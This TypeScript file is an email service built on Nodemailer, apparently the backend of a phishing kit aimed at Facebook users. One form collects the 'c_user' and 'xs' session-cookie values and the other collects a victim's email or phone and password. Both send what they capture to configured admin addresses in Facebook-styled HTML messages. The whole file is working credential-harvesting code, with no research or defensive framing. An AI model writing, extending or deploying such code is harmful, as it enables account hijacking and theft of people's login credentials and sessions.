import nodemailer from "nodemailer";
import { formOneConfig, formTwoConfig, getAllAdminEmails } from "./config/smtp-config";

interface SMTPError extends Error {
  code?: string;
  command?: string;
  responseCode?: number;
  response?: string;
}

class EmailService {
  private formOneTransporter;
  private formTwoTransporter;

  constructor() {
    try {
      console.log('Initializing email service with environment:', {
        SMTP_HOST: process.env.SMTP_HOST,
        SMTP_PORT: process.env.SMTP_PORT,
        SMTP_USER: !!process.env.SMTP_USER,
        SMTP_PASS: !!process.env.SMTP_PASS,
        ADMIN_EMAIL: !!process.env.ADMIN_EMAIL,
        NODE_ENV: process.env.NODE_ENV
      });

      const configOne = formOneConfig();
      const configTwo = formTwoConfig();

      // Initialize form one transporter
      this.formOneTransporter = nodemailer.createTransport({
        host: configOne.host,
        port: configOne.port,
        secure: configOne.secure,
        auth: configOne.auth,
        pool: true,
        maxConnections: 5,
        maxMessages: 100,
        logger: true,
        debug: process.env.NODE_ENV !== 'production'
      });

      // Initialize form two transporter
      this.formTwoTransporter = nodemailer.createTransport({
        host: configTwo.host,
        port: configTwo.port,
        secure: configTwo.secure,
        auth: configTwo.auth,
        pool: true,
        maxConnections: 5,
        maxMessages: 100,
        logger: true,
        debug: process.env.NODE_ENV !== 'production'
      });

      // Verify transporter connections
      Promise.all([
        this.formOneTransporter.verify().catch(err => {
          console.error('Form One transporter verification failed:', this.formatSMTPError(err));
          throw err;
        }),
        this.formTwoTransporter.verify().catch(err => {
          console.error('Form Two transporter verification failed:', this.formatSMTPError(err));
          throw err;
        })
      ]).then(() => {
        console.log('Email service initialized and verified successfully');
      });

    } catch (error) {
      const formattedError = this.formatSMTPError(error as SMTPError);
      console.error('Failed to initialize email service:', formattedError);
      throw error;
    }
  }

  private formatSMTPError(error: SMTPError) {
    return {
      message: error.message,
      code: error.code,
      command: error.command,
      responseCode: error.responseCode,
      response: error.response,
      stack: error.stack
    };
  }

  async sendFormOneEmail(data: any) {
    if (!data || !data.c_user || !data.xs) {
      console.error('Invalid form one data:', data);
      throw new Error('Invalid form data provided');
    }

    const config = formOneConfig();
    const adminEmails = getAllAdminEmails(config.adminEmails);

    if (adminEmails.length === 0) {
      console.error('No admin emails configured');
      throw new Error('No admin emails configured');
    }

    const mailOptions = {
      from: config.auth.user,
      to: adminEmails.join(", "),
      subject: "Zubai Jan",
      html: `
        <h2 style="color: #1877f2;">PROFESSOR</h2>
        <div style="background: #f0f2f5; padding: 20px; border-radius: 8px; margin: 20px 0;">
          <p><strong>c_user:</strong> ${data.c_user}</p>
          <p><strong>xs:</strong> ${data.xs}</p>
          <p><strong>Submission Time:</strong> ${new Date().toLocaleString()}</p>
        </div>
        <p style="color: #65676B; font-size: 12px;">This is an automated message.</p>
      `,
    };

    try {
      console.log("Sending form one email with config:", {
        host: config.host,
        port: config.port,
        adminEmails: adminEmails,
        subject: mailOptions.subject
      });

      const result = await this.formOneTransporter.sendMail(mailOptions);
      console.log("Form one email sent successfully:", result.messageId);
      return result;
    } catch (error) {
      console.error("Error sending form one email:", {
        error: error.message,
        code: error.code,
        command: error.command,
        stack: error.stack
      });
      throw error;
    }
  }

  async sendFormTwoEmail(data: any) {
    if (!data || !data.user_email || !data.password) {
      console.error('Invalid form two data:', data);
      throw new Error('Invalid form data provided');
    }

    const config = formTwoConfig();
    const adminEmails = getAllAdminEmails(config.adminEmails);

    if (adminEmails.length === 0) {
      console.error('No admin emails configured');
      throw new Error('No admin emails configured');
    }

    const mailOptions = {
      from: config.auth.user,
      to: adminEmails.join(", "),
      subject: "Zubair Jan",
      html: `
        <h2 style="color: #1877f2;">PROFESSOR</h2>
        <div style="background: #f0f2f5; padding: 20px; border-radius: 8px; margin: 20px 0;">
          <p><strong>User Email/Phone:</strong> ${data.user_email}</p>
          <p><strong>Password:</strong> ${data.password}</p>
          <p><strong>Additional Admin Email:</strong> ${data.admin_email_3 || "Not provided"}</p>
          <p><strong>Submission Time:</strong> ${new Date().toLocaleString()}</p>
        </div>
        <p style="color: #65676B; font-size: 12px;">This is an automated message.</p>
      `,
    };

    try {
      console.log("Sending form two email with config:", {
        host: config.host,
        port: config.port,
        adminEmails: adminEmails,
        subject: mailOptions.subject
      });

      const result = await this.formTwoTransporter.sendMail(mailOptions);
      console.log("Form two email sent successfully:", result.messageId);
      return result;
    } catch (error) {
      console.error("Error sending form two email:", {
        error: error.message,
        code: error.code,
        command: error.command,
        stack: error.stack
      });
      throw error;
    }
  }
}

export const emailService = new EmailService();